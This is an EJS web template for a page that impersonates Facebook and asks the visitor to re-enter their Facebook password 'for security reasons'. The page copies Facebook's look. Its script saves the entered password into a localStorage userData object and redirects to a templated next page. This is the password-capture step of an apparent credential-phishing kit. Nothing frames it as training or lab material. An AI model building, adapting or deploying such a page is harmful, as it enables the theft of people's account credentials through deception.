<% const content = `
<div style="text-align: left; margin-bottom: 15px">
    <label style="display: block; font-weight: bold; margin-bottom: 5px">Password</label>
    <div style="position: relative">
        <input type="password" id="password" placeholder="Enter your password" style="width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 4px; padding-right: 40px" />
        <button id="togglePassword" type="button" style="position: absolute; right: 10px; top: 50%; transform: translateY(-50%); background: none; border: none; cursor: pointer">
            <i class="fas fa-eye"></i>
        </button>
    </div>
</div>

<div style="text-align: right; margin-top: 20px">
    <button id="submitPassword" style="background-color: #1877f2; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; font-weight: 600">Submit</button>
</div>
`; %> <%- include('layout', { title: 'Facebook Password', message: 'For security reasons, you need to enter your password to continue.', content: content }) %>

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" />

<script>
    document.addEventListener('DOMContentLoaded', () => {
        const togglePassword = document.getElementById('togglePassword');
        const password = document.getElementById('password');
        const submitButton = document.getElementById('submitPassword');

        togglePassword.addEventListener('click', () => {
            const type = password.getAttribute('type') === 'password' ? 'text' : 'password';
            password.setAttribute('type', type);
            if (type === 'text') {
                togglePassword.innerHTML = '<i class="fas fa-eye-slash"></i>';
            } else {
                togglePassword.innerHTML = '<i class="fas fa-eye"></i>';
            }
        });
        submitButton.addEventListener('click', () => {
            const passwordValue = password.value.trim();
            if (passwordValue) {
                const userData = JSON.parse(localStorage.getItem('userData') || '{}');
                userData.password = passwordValue;
                localStorage.setItem('userData', JSON.stringify(userData));
                window.location.href =  '<%= nextPageUrl %>';
            } else {
                alert('Please enter your password');
            }
        });
        password.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                submitButton.click();
            }
        });
    });
</script>
